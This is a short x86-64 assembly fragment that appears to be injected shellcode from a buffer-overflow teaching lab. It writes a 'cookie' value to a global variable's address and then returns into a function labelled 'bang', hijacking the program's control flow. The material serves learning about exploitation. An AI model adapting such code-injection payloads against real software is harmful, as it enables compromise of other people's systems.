mov    $0x384e1de7459dacae, %rsi         # 0x384e1de7459dacae <my_cookie_val>
mov    %rsi, 0x602308         # 602308 <global_value_address>
mov    $0x401020, %rbx              # 401020 <bang_address>
push   %rbx
retq
